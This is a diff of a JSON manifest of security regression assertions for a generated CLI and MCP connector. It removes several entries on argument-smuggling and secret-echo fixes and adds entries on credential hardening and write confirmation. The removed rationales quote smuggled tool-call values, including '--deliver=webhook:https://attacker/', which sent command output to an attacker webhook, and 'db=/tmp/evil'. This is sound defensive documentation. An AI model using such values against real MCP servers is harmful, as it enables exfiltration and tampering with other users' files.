@@ -85,7 +85,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -107,6 +107,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -146,352 +176,644 @@
      "file": "mcp-install.md",
      "contains": "\"ABNORMAL_BASE_URL\":",
      "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "file": "manifest.json",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\": \"${user_config.printing_press_client_profile}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
+     "file": "server.json",
+     "contains": "\"name\": \"PRINTING_PRESS_CLIENT_PROFILE\"",
      "min_count": 1
     },
     {
      "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
+     "contains": "\"PRINTING_PRESS_CLIENT_PROFILE\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"ABNORMAL_MCP_READ_ONLY\": \"${user_config.abnormal_mcp_read_only}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"ABNORMAL_MCP_READ_ONLY\"",
      "min_count": 1
     },
     {
      "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
+     "contains": "\"ABNORMAL_MCP_READ_ONLY\":",
+     "min_count": 3
     },
     {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
+     "file": "manifest.json",
+     "contains": "\"ABNORMAL_NO_LOCAL_DATA\": \"${user_config.abnormal_no_local_data}\"",
      "min_count": 1
     },
     {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
+     "file": "server.json",
+     "contains": "\"name\": \"ABNORMAL_NO_LOCAL_DATA\"",
      "min_count": 1
     },
     {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
+     "file": "mcp-install.md",
+     "contains": "\"ABNORMAL_NO_LOCAL_DATA\":",
+     "min_count": 3
     },
     {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
+     "file": "manifest.json",
+     "contains": "\"ABNORMAL_USER_AGENT\": \"${user_config.abnormal_user_agent}\"",
      "min_count": 1
     },
     {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
+     "file": "server.json",
+     "contains": "\"name\": \"ABNORMAL_USER_AGENT\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"ABNORMAL_USER_AGENT\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"ABNORMAL_MCP_HTTP_TOKEN\": \"${user_config.abnormal_mcp_http_token}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"ABNORMAL_MCP_HTTP_TOKEN\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"ABNORMAL_MCP_HTTP_TOKEN\":",
+     "min_count": 3
     }
    ]
   },
   {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
+   "id": "journal-credential-hardening",
+   "class": "credential-kit",
    "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
+   "summary": "The learn journal minimizes what it keeps: the <PREFIX>_LEARN_SESSION override is stored as \"o:\" plus the 64-bit SHA-256 hash the harness session ids get; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder, and nothing after \"--\"; failed_flag is never kept as typed (the placeholder plus the typed name's hash when Cobra suggested a declared flag, else nothing); teach.log records argument counts, never the arguments. Every line that reaches the journal, teach.log, the learnings audit, feedback.jsonl, profiles.json or the learn store passes the credential kit's file and SQL sinks.",
+   "why": "A credential typed where a flag goes, or set as a session label, is not a value the kit has held, so the structural rules must keep it out on their own. The connector's own RefuseHeld checks on each store are replaced by the kit's sinks (credkit-wiring, credkit-sqlite-every-handle). internal/learn/journal_credential_hardening_test.go drives every path, unheld and then held by the kit in a child process.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments; and every template that stores operator-named text should refuse one that repeats a held credential.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "\tlookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}\n\tisBoolFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && f.Value.Type() == \"bool\"\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/cmd/abnormal-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\t\tCmd:           journalVerbChain(rootCmd, executed),\n\t\tArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
      "code_only": true
     },
     {
-     "file": "cli/cmd/abnormal-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
      "code_only": true
     },
     {
-     "file": "cli/cmd/abnormal-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tisDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}\n\tlearn.JournalInvocation(learn.JournalEntry{",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "RefuseHeld"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "credkit.Hold(\"test:journal\", journalHardeningSecret, journalHardeningName)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "secret-echo",
+   "summary": "The on-disk response cache is off on every client: raw Abnormal bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (abnormal_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to abnormal from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/abnormal_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Abnormal state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/abnormal_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to abnormal from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/abnormal_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/abnormal_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/abnormalblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to abnormal from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to abnormal from the liongard 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
